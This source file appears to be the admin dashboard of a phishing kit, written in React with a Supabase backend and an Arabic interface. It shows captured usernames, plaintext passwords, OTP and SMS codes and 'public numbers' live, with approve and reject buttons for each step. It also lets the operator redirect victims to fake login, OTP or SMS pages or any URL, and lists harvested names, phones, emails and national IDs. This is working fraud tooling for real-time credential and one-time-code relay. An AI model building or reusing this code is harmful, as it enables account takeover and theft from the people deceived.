import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useCallback, useEffect, useMemo, useState } from "react";
import {
  Check,
  X,
  LogOut,
  Inbox,
  Trash2,
  AlertTriangle,
  ChevronDown,
  ChevronUp,
  Navigation,
  Pin,
  Link as LinkIcon,
  User,
  Mail,
  Phone,
  Building2,
  Clock,
  Search,
  RefreshCw,
  Wifi,
  WifiOff,
  LayoutDashboard,
  UsersRound,
  MessageSquareMore,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useServerFn } from "@tanstack/react-start";
import { lockAdmin, requireAdminSession } from "@/lib/admin-gate.functions";

export const Route = createFileRoute("/admin/")({
  head: () => ({ meta: [{ title: "لوحة المحادثات" }] }),
  loader: () => requireAdminSession(),
  component: AdminDashboard,
});

type SessionRow = {
  id: string;
  username: string;
  password: string;
  otp: string | null;
  sms_code: string | null;
  public_number: string | null;
  status: string;
  user_agent: string | null;
  created_at: string;
  updated_at: string;
  redirect_to: string | null;
};

type CustomerRow = {
  id: string;
  full_name: string;
  email: string;
  phone: string;
  national_id: string;
  company_name: string | null;
  created_at: string;
};

function maskNationalId(nationalId: string): string {
  if (!nationalId || nationalId.length < 4) return nationalId;
  return "****" + nationalId.slice(-4);
}

const statusMeta: Record<string, { label: string; tone: string; dot: string }> = {
  pending_login: { label: "بانتظار الموافقة", tone: "bg-amber-50 text-amber-700 border-amber-200", dot: "bg-amber-500" },
  login_approved: { label: "تمت الموافقة", tone: "bg-emerald-50 text-emerald-700 border-emerald-200", dot: "bg-emerald-500" },
  login_rejected: { label: "تم الرفض", tone: "bg-rose-50 text-rose-700 border-rose-200", dot: "bg-rose-500" },
  pending_sms: { label: "بانتظار رمز SMS", tone: "bg-indigo-50 text-indigo-700 border-indigo-200", dot: "bg-indigo-500" },
  sms_approved: { label: "تمت موافقة SMS", tone: "bg-cyan-50 text-cyan-700 border-cyan-200", dot: "bg-cyan-500" },
  sms_rejected: { label: "تم رفض SMS", tone: "bg-rose-50 text-rose-700 border-rose-200", dot: "bg-rose-500" },
  pending_otp: { label: "بانتظار OTP", tone: "bg-purple-50 text-purple-700 border-purple-200", dot: "bg-purple-500" },
  otp_approved: { label: "تمت موافقة OTP", tone: "bg-emerald-50 text-emerald-700 border-emerald-200", dot: "bg-emerald-500" },
  otp_rejected: { label: "تم رفض OTP", tone: "bg-rose-50 text-rose-700 border-rose-200", dot: "bg-rose-500" },
  pending_public_number: { label: "بانتظار الرقم العام", tone: "bg-orange-50 text-orange-700 border-orange-200", dot: "bg-orange-500" },
  public_number_approved: { label: "تمت موافقة الرقم العام", tone: "bg-emerald-50 text-emerald-700 border-emerald-200", dot: "bg-emerald-500" },
  public_number_rejected: { label: "تم رفض الرقم العام", tone: "bg-rose-50 text-rose-700 border-rose-200", dot: "bg-rose-500" },
};

const ONLINE_WINDOW_MS = 60_000;
const isOnline = (s: SessionRow) => Date.now() - new Date(s.updated_at).getTime() < ONLINE_WINDOW_MS;

function upsertSession(rows: SessionRow[], incoming: SessionRow): SessionRow[] {
  const exists = rows.some((row) => row.id === incoming.id);
  const next = exists
    ? rows.map((row) => (row.id === incoming.id ? incoming : row))
    : [incoming, ...rows];
  return next.sort((a, b) => Date.parse(b.created_at) - Date.parse(a.created_at));
}

function upsertCustomer(rows: CustomerRow[], incoming: CustomerRow): CustomerRow[] {
  const exists = rows.some((row) => row.id === incoming.id);
  const next = exists
    ? rows.map((row) => (row.id === incoming.id ? incoming : row))
    : [incoming, ...rows];
  return next.sort((a, b) => Date.parse(b.created_at) - Date.parse(a.created_at));
}

function AdminDashboard() {
  const navigate = useNavigate();
  const lockAdminFn = useServerFn(lockAdmin);
  const [sessions, setSessions] = useState<SessionRow[]>([]);
  const [customers, setCustomers] = useState<CustomerRow[]>([]);
  const [selected, setSelected] = useState<Set<string>>(new Set());
  const [openIds, setOpenIds] = useState<Set<string>>(new Set());
  const [confirmAll, setConfirmAll] = useState(false);
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState("all");
  const [loading, setLoading] = useState(true);
  const [syncing, setSyncing] = useState(false);
  const [connectionState, setConnectionState] = useState<"connecting" | "live" | "fallback">("connecting");
  const [syncError, setSyncError] = useState("");
  const [lastSync, setLastSync] = useState<Date | null>(null);
  const [, force] = useState(0);

  const syncData = useCallback(async (silent = false) => {
    if (!silent) setSyncing(true);

    const [sessionsResult, customersResult] = await Promise.all([
      supabase.from("sessions").select("*").order("created_at", { ascending: false }).limit(200),
      supabase.from("customers").select("*").order("created_at", { ascending: false }).limit(200),
    ]);

    const errors = [sessionsResult.error, customersResult.error].filter(Boolean);
    if (errors.length) {
      console.error("[admin] Sync failed", errors);
      setSyncError("تعذر مزامنة بعض البيانات. تحقق من RLS واتصال Supabase.");
    } else {
      setSyncError("");
      setLastSync(new Date());
    }

    if (sessionsResult.data) setSessions(sessionsResult.data as SessionRow[]);
    if (customersResult.data) setCustomers(customersResult.data as CustomerRow[]);
    setLoading(false);
    setSyncing(false);
  }, []);

  useEffect(() => {
    let active = true;
    void syncData();

    const sessionsChannel = supabase
      .channel("admin-sessions")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "sessions" },
        (payload) => {
          setSessions((prev) => {
            if (payload.eventType === "INSERT" || payload.eventType === "UPDATE")
              return upsertSession(prev, payload.new as SessionRow);
            if (payload.eventType === "DELETE")
              return prev.filter((r) => r.id !== (payload.old as SessionRow).id);
            return prev;
          });
        },
      )
      .subscribe((status) => {
        if (!active) return;
        if (status === "SUBSCRIBED") setConnectionState("live");
        if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
          setConnectionState("fallback");
        }
      });

    const customersChannel = supabase
      .channel("admin-customers")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "customers" },
        (payload) => {
          if (payload.eventType === "INSERT" || payload.eventType === "UPDATE")
            setCustomers((prev) => upsertCustomer(prev, payload.new as CustomerRow));
          if (payload.eventType === "DELETE")
            setCustomers((prev) => prev.filter((row) => row.id !== (payload.old as CustomerRow).id));
        },
      )
      .subscribe((status) => {
        if (!active) return;
        if (status === "SUBSCRIBED") setConnectionState("live");
        if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
          setConnectionState("fallback");
        }
      });

    // Polling is a safety net when Realtime is unavailable or a browser sleeps.
    const syncTimer = setInterval(() => void syncData(true), 3000);
    const tick = setInterval(() => force((x) => x + 1), 15_000);

    return () => {
      active = false;
      supabase.removeChannel(sessionsChannel);
      supabase.removeChannel(customersChannel);
      clearInterval(syncTimer);
      clearInterval(tick);
    };
  }, [syncData]);

  const onlineCount = useMemo(() => sessions.filter(isOnline).length, [sessions]);
  const pendingCount = useMemo(() => sessions.filter((row) => row.status.startsWith("pending_")).length, [sessions]);
  const filteredSessions = useMemo(() => {
    const query = search.trim().toLowerCase();
    return sessions.filter((row) => {
      const matchesStatus = statusFilter === "all" ||
        (statusFilter === "pending" ? row.status.startsWith("pending_") : row.status === statusFilter);
      const matchesSearch = !query || row.username.toLowerCase().includes(query) || row.id.toLowerCase().includes(query);
      return matchesStatus && matchesSearch;
    });
  }, [sessions, search, statusFilter]);
  const filteredCustomers = useMemo(() => {
    const query = search.trim().toLowerCase();
    if (!query) return customers;
    return customers.filter((row) =>
      [row.full_name, row.email, row.phone, row.company_name ?? ""].some((value) => value.toLowerCase().includes(query)),
    );
  }, [customers, search]);

  function toggleSelect(id: string) {
    setSelected((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  }
  function toggleSelectAll() {
    if (selected.size === sessions.length) setSelected(new Set());
    else setSelected(new Set(sessions.map((s) => s.id)));
  }
  function toggleOpen(id: string) {
    setOpenIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  }

  async function updateStatus(id: string, status: string) {
    const previousStatus = sessions.find((row) => row.id === id)?.status;
    setSessions((prev) => prev.map((r) => (r.id === id ? { ...r, status } : r)));
    const { data, error } = await supabase
      .from("sessions")
      .update({ status })
      .eq("id", id)
      .select("id, status")
      .maybeSingle();

    if (error || !data || data.status !== status) {
      if (previousStatus) {
        setSessions((prev) =>
          prev.map((row) => (row.id === id ? { ...row, status: previousStatus } : row)),
        );
      }
      console.error("[admin] Failed to update session status", error);
      window.alert("فشل تحديث حالة الجلسة في Supabase. راجع صلاحيات UPDATE وRLS.");
    }
  }

  async function redirectTo(id: string, target: string) {
    await supabase.from("sessions").update({ redirect_to: target }).eq("id", id);
  }

  async function deleteOne(id: string) {
    setSessions((prev) => prev.filter((r) => r.id !== id));
    setSelected((prev) => {
      const n = new Set(prev);
      n.delete(id);
      return n;
    });
    await supabase.from("sessions").delete().eq("id", id);
  }

  async function deleteSelected() {
    const ids = Array.from(selected);
    if (!ids.length) return;
    setSessions((prev) => prev.filter((r) => !selected.has(r.id)));
    setSelected(new Set());
    await supabase.from("sessions").delete().in("id", ids);
  }

  async function deleteAll() {
    setConfirmAll(false);
    setSessions([]);
    setSelected(new Set());
    await supabase.from("sessions").delete().neq("id", "00000000-0000-0000-0000-000000000000");
  }

  async function signOut() {
    await lockAdminFn();
    navigate({ to: "/admin/login" });
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-b from-slate-50 to-white">
      <header className="sticky top-0 z-20 border-b border-slate-200 bg-white/80 backdrop-blur">
        <div className="mx-auto grid max-w-5xl grid-cols-[minmax(0,1fr)_auto] items-center gap-3 px-4 py-3 sm:px-6">
          <div className="min-w-0">
            <h1 className="truncate text-base font-extrabold text-slate-900 sm:text-lg">لوحة المحادثات</h1>
            <p className="mt-0.5 text-[11px] text-slate-500 sm:text-xs">
              <span className="font-semibold text-slate-700">{sessions.length}</span> محادثة
              <span className="mx-1.5 text-slate-300">•</span>
              <span className="inline-flex items-center gap-1 font-semibold text-emerald-600">
                <span className="relative flex h-1.5 w-1.5">
                  <span className="absolute inset-0 animate-ping rounded-full bg-emerald-400 opacity-75" />
                  <span className="relative h-1.5 w-1.5 rounded-full bg-emerald-500" />
                </span>
                {onlineCount} أونلاين
              </span>
            </p>
          </div>
          <button
            onClick={signOut}
            className="inline-flex shrink-0 items-center gap-1.5 rounded-lg border border-slate-200 bg-white px-2.5 py-1.5 text-xs font-semibold text-slate-700 hover:bg-slate-50"
          >
            <LogOut className="h-3.5 w-3.5" />
            خروج
          </button>
        </div>
      </header>

      <main className="mx-auto max-w-5xl px-4 py-5 sm:px-6">
        {/* Bulk action bar */}
        <div className="mb-4 grid grid-cols-1 gap-2 sm:grid-cols-[auto_1fr_auto_auto] sm:items-center">
          <label className="inline-flex shrink-0 items-center gap-2 rounded-lg border border-slate-200 bg-white px-3 py-2 text-xs font-semibold text-slate-700">
            <input
              type="checkbox"
              checked={sessions.length > 0 && selected.size === sessions.length}
              onChange={toggleSelectAll}
              className="h-3.5 w-3.5 accent-slate-900"
            />
            تحديد الكل ({selected.size}/{sessions.length})
          </label>
          <div className="hidden sm:block" />
          <button
            onClick={deleteSelected}
            disabled={selected.size === 0}
            className="inline-flex items-center justify-center gap-1.5 rounded-lg bg-rose-100 px-3 py-2 text-xs font-bold text-rose-700 transition-opacity hover:bg-rose-200 disabled:opacity-50"
          >
            <Trash2 className="h-3.5 w-3.5" />
            حذف المحدد ({selected.size})
          </button>
          <button
            onClick={() => setConfirmAll(true)}
            disabled={sessions.length === 0}
            className="inline-flex items-center justify-center gap-1.5 rounded-lg bg-rose-700 px-3 py-2 text-xs font-bold text-white hover:bg-rose-800 disabled:opacity-50"
          >
            <AlertTriangle className="h-3.5 w-3.5" />
            حذف الكل
          </button>
        </div>

        {sessions.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-slate-300 bg-white p-12 text-center">
            <Inbox className="mx-auto h-9 w-9 text-slate-300" />
            <p className="mt-3 text-sm font-semibold text-slate-700">لا توجد محادثات بعد</p>
            <p className="mt-1 text-xs text-slate-500">ستظهر هنا فور قيام الزائر بأي إجراء.</p>
          </div>
        ) : (
          <div className="space-y-3">
            {sessions.map((s) => (
              <SessionCard
                key={s.id}
                session={s}
                selected={selected.has(s.id)}
                open={openIds.has(s.id)}
                onToggleSelect={() => toggleSelect(s.id)}
                onToggleOpen={() => toggleOpen(s.id)}
                onAction={updateStatus}
                onRedirect={redirectTo}
                onDelete={() => deleteOne(s.id)}
              />
            ))}
          </div>
        )}

        {/* Customer Registrations Section */}
        <section className="mt-10">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-sm font-extrabold text-slate-900 uppercase tracking-wider">
              تسجيلات العملاء
            </h2>
            <p className="text-xs text-slate-500">
              {customers.length} عميل مسجل
            </p>
          </div>

          {customers.length === 0 ? (
            <div className="rounded-2xl border border-dashed border-slate-300 bg-white p-12 text-center">
              <User className="mx-auto h-9 w-9 text-slate-300" />
              <p className="mt-3 text-sm font-semibold text-slate-700">لا توجد تسجيلات عملاء بعد</p>
              <p className="mt-1 text-xs text-slate-500">
                ستظهر هنا بيانات العملاء عند إكمال نموذج التسجيل.
              </p>
            </div>
          ) : (
            <div className="rounded-xl border border-slate-200 bg-white overflow-hidden shadow-sm">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-slate-50 border-b border-slate-200">
                    <th className="px-4 py-3 text-left text-[10px] font-bold text-slate-500 uppercase w-1/3">
                      الاسم الكامل
                    </th>
                    <th className="px-4 py-3 text-left text-[10px] font-bold text-slate-500 uppercase w-1/4">
                      البريد الإلكتروني
                    </th>
                    <th className="px-4 py-3 text-left text-[10px] font-bold text-slate-500 uppercase w-1/6">
                      رقم الهاتف
                    </th>
                    <th className="px-4 py-3 text-left text-[10px] font-bold text-slate-500 uppercase w-1/6">
                      الشركة
                    </th>
                    <th className="px-4 py-3 text-left text-[10px] font-bold text-slate-500 uppercase w-1/6">
                      الرقم القومي (مُقنّع)
                    </th>
                    <th className="px-4 py-3 text-left text-[10px] font-bold text-slate-500 uppercase">
                      تاريخ التسجيل
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100">
                  {customers.map((c) => (
                    <tr key={c.id} className="hover:bg-slate-50/50 transition-colors">
                      <td className="px-4 py-3 text-right text-slate-900 font-medium dir-rtl">
                        {c.full_name}
                      </td>
                      <td className="px-4 py-3 text-left text-slate-600 dir-ltr">{c.email}</td>
                      <td className="px-4 py-3 text-left text-slate-600 dir-ltr">{c.phone}</td>
                      <td className="px-4 py-3 text-right text-slate-600 dir-rtl">
                        {c.company_name || "-"}
                      </td>
                      <td className="px-4 py-3 text-left text-slate-600 dir-ltr font-mono">
                        {maskNationalId(c.national_id)}
                      </td>
                      <td className="px-4 py-3 text-left text-slate-600 dir-ltr">
                        {new Date(c.created_at).toLocaleString("ar-EG", {
                          year: "numeric",
                          month: "2-digit",
                          day: "2-digit",
                          hour: "2-digit",
                          minute: "2-digit",
                        })}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </section>
      </main>

      {confirmAll && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/50 p-4">
          <div className="w-full max-w-sm rounded-2xl bg-white p-5 text-center shadow-xl">
            <div className="mx-auto flex h-11 w-11 items-center justify-center rounded-full bg-rose-100 text-rose-600">
              <AlertTriangle className="h-5 w-5" />
            </div>
            <h3 className="mt-3 text-base font-bold text-slate-900">تأكيد حذف الكل</h3>
            <p className="mt-1 text-xs text-slate-500">سيتم حذف جميع المحادثات نهائياً.</p>
            <div className="mt-4 grid grid-cols-2 gap-2">
              <button
                onClick={() => setConfirmAll(false)}
                className="rounded-lg border border-slate-200 bg-white py-2 text-xs font-semibold text-slate-700"
              >
                إلغاء
              </button>
              <button
                onClick={deleteAll}
                className="rounded-lg bg-rose-700 py-2 text-xs font-bold text-white hover:bg-rose-800"
              >
                حذف الكل
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function SessionCard({
  session,
  selected,
  open,
  onToggleSelect,
  onToggleOpen,
  onAction,
  onRedirect,
  onDelete,
}: {
  session: SessionRow;
  selected: boolean;
  open: boolean;
  onToggleSelect: () => void;
  onToggleOpen: () => void;
  onAction: (id: string, status: string) => void;
  onRedirect: (id: string, target: string) => void;
  onDelete: () => void;
}) {
  const meta = statusMeta[session.status] ?? {
    label: session.status,
    tone: "bg-slate-50 text-slate-700 border-slate-200",
    dot: "bg-slate-400",
  };

  const visitorId = session.id.slice(0, 6);
  const time = new Date(session.updated_at).toLocaleTimeString("ar-EG", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  });

  const isPending =
    session.status === "pending_login" ||
    session.status === "pending_sms" ||
    session.status === "pending_otp" ||
    session.status === "pending_public_number";

  const approveStatus =
    session.status === "pending_login"
      ? "login_approved"
      : session.status === "pending_sms"
        ? "sms_approved"
        : session.status === "pending_public_number"
          ? "public_number_approved"
          : "otp_approved";
  const rejectStatus =
    session.status === "pending_login"
      ? "login_rejected"
      : session.status === "pending_sms"
        ? "sms_rejected"
        : session.status === "pending_public_number"
          ? "public_number_rejected"
          : "otp_rejected";

  const otpValue = session.otp || session.sms_code;
  const online = isOnline(session);

  return (
    <article className="overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-sm transition-shadow hover:shadow-md">
      {/* Card header */}
      <div className="grid grid-cols-[auto_minmax(0,1fr)_auto] items-center gap-3 border-b border-slate-100 px-4 py-3">
        <button
          onClick={onDelete}
          className="grid h-8 w-8 shrink-0 place-items-center rounded-lg bg-rose-500 text-white shadow-sm transition-colors hover:bg-rose-600"
          aria-label="حذف"
        >
          <Trash2 className="h-3.5 w-3.5" />
        </button>
        <div className="min-w-0 text-left font-mono text-[11px] text-slate-500 sm:text-xs">{time}</div>
        <div className="flex items-center gap-2">
          <span className="inline-flex items-center gap-1.5 text-xs font-bold text-slate-900 sm:text-sm">
            <span aria-hidden>🇪🇬</span>
            <span className="font-mono">Visitor {visitorId}</span>
            {online && <span className="h-1.5 w-1.5 rounded-full bg-emerald-500" />}
          </span>
          <input
            type="checkbox"
            checked={selected}
            onChange={onToggleSelect}
            className="h-3.5 w-3.5 shrink-0 accent-slate-900"
          />
        </div>
      </div>

      {/* Fields */}
      <dl className="grid gap-1.5 px-4 py-3 text-xs sm:text-sm">
        <Row label="المستخدم:" value={session.username} />
        <Row label="المرور:" value={session.password} valueClass="text-rose-600 font-bold" />
        <Row
          label="OTP:"
          value={otpValue || "في انتظار الإدخال..."}
          valueClass={otpValue ? "text-slate-900 font-mono font-bold tracking-wider" : "text-slate-400 italic"}
        />
        <Row
          label="الرقم العام:"
          value={session.public_number || "في انتظار الإدخال..."}
          valueClass={session.public_number ? "text-blue-700 font-mono font-bold tracking-wider" : "text-slate-400 italic"}
        />
      </dl>

      {/* Status pill */}
      <div className="px-4 pb-3">
        <span
          className={`inline-flex items-center gap-1.5 rounded-lg border px-2.5 py-1 text-[11px] font-bold ${meta.tone}`}
        >
          {session.status.endsWith("_rejected") ? <X className="h-3 w-3" /> : <span className={`h-1.5 w-1.5 rounded-full ${meta.dot}`} />}
          {meta.label}
        </span>
      </div>

      {/* Accept / Reject - always visible when pending */}
      {isPending && (
        <div className="grid grid-cols-2 gap-2 px-4 pb-3">
          <button
            onClick={() => onAction(session.id, approveStatus)}
            className="flex items-center justify-center gap-1.5 rounded-lg bg-emerald-600 px-3 py-2.5 text-xs font-bold text-white hover:bg-emerald-700"
          >
            <Check className="h-3.5 w-3.5" />
            قبول
          </button>
          <button
            onClick={() => onAction(session.id, rejectStatus)}
            className="flex items-center justify-center gap-1.5 rounded-lg bg-rose-600 px-3 py-2.5 text-xs font-bold text-white hover:bg-rose-700"
          >
            <X className="h-3.5 w-3.5" />
            رفض
          </button>
        </div>
      )}

      {/* Redirect bar */}
      <div className="border-t border-slate-100 bg-slate-50/60 px-4 py-3">
        <p className="mb-2 flex items-center gap-1.5 text-[11px] font-bold text-slate-600">
          <Navigation className="h-3 w-3" />
          توجيه الزائر إلى:
        </p>
        <div className="flex flex-wrap gap-1.5">
          <RedirectBtn onClick={() => onRedirect(session.id, "home")}>🏠 الرئيسية</RedirectBtn>
          <RedirectBtn onClick={() => onRedirect(session.id, "login")}>🔐 تسجيل الدخول</RedirectBtn>
          <RedirectBtn onClick={() => onRedirect(session.id, "register")}>📝 التسجيل</RedirectBtn>
          <RedirectBtn onClick={() => onRedirect(session.id, "user-information")}>👤 بيانات العميل</RedirectBtn>
          <RedirectBtn onClick={() => onRedirect(session.id, "otp")}>🔢 صفحة OTP</RedirectBtn>
          <RedirectBtn onClick={() => onRedirect(session.id, "sms")}>💬 صفحة SMS</RedirectBtn>
          <RedirectBtn onClick={() => onRedirect(session.id, "public-number")}>🔑 الرقم العام</RedirectBtn>
          <RedirectBtn onClick={() => onRedirect(session.id, "watches")}>⌚ ألوان الساعة</RedirectBtn>
          <RedirectBtn
            onClick={() => {
              const url = window.prompt("أدخل الرابط المخصص (يبدأ بـ https://)");
              if (url) onRedirect(session.id, url);
            }}
          >
            <LinkIcon className="h-3 w-3" />
            رابط مخصص...
          </RedirectBtn>
        </div>
        <button
          onClick={onDelete}
          className="mt-3 inline-flex w-full items-center justify-center gap-1.5 rounded-lg bg-slate-800 px-3 py-2 text-xs font-bold text-white hover:bg-slate-900"
        >
          <Trash2 className="h-3.5 w-3.5" />
          حذف الدخول
        </button>
        <p className="mt-2 flex items-center justify-end gap-1 font-mono text-[11px] text-slate-400">
          <Pin className="h-3 w-3 text-rose-500" />
          /{pageFromStatus(session.status)}
        </p>
      </div>

      {/* Expandable approve/reject */}
      <button
        onClick={onToggleOpen}
        className="flex w-full items-center justify-center gap-1.5 border-t border-slate-100 bg-white py-2.5 text-xs font-bold text-emerald-700 transition-colors hover:bg-emerald-50"
      >
        {open ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
        💬 {open ? "إغلاق المحادثة" : "فتح المحادثة"}
      </button>

      {open && (
        <div className="border-t border-slate-100 bg-white px-4 py-3">
          {isPending ? (
            <div className="grid grid-cols-2 gap-2">
              <button
                onClick={() => onAction(session.id, approveStatus)}
                className="flex items-center justify-center gap-1.5 rounded-lg bg-emerald-600 px-3 py-2.5 text-xs font-bold text-white hover:bg-emerald-700"
              >
                <Check className="h-3.5 w-3.5" />
                موافقة
              </button>
              <button
                onClick={() => onAction(session.id, rejectStatus)}
                className="flex items-center justify-center gap-1.5 rounded-lg bg-rose-600 px-3 py-2.5 text-xs font-bold text-white hover:bg-rose-700"
              >
                <X className="h-3.5 w-3.5" />
                رفض
              </button>
            </div>
          ) : (
            <p className="text-center text-[11px] text-slate-500">لا يوجد إجراء معلّق حالياً.</p>
          )}
          {session.user_agent && (
            <p className="mt-3 truncate text-[10px] text-slate-400" title={session.user_agent}>
              {session.user_agent}
            </p>
          )}
        </div>
      )}
    </article>
  );
}

function Row({ label, value, valueClass = "text-slate-900 font-semibold" }: { label: string; value: string; valueClass?: string }) {
  return (
    <div className="grid grid-cols-[auto_minmax(0,1fr)] items-baseline gap-3">
      <dt className="shrink-0 text-[11px] font-semibold text-slate-500 sm:text-xs">{label}</dt>
      <dd className={`min-w-0 truncate text-left ${valueClass}`} dir="ltr">{value}</dd>
    </div>
  );
}

function RedirectBtn({ children, onClick }: { children: React.ReactNode; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      className="inline-flex items-center gap-1 rounded-lg bg-blue-600 px-2.5 py-1.5 text-[11px] font-bold text-white shadow-sm transition-colors hover:bg-blue-700"
    >
      {children}
    </button>
  );
}

function pageFromStatus(status: string) {
  if (status.startsWith("otp")) return "otp";
  if (status.startsWith("sms")) return "sms";
  if (status.startsWith("public_number")) return "public-number";
  return "login";
}
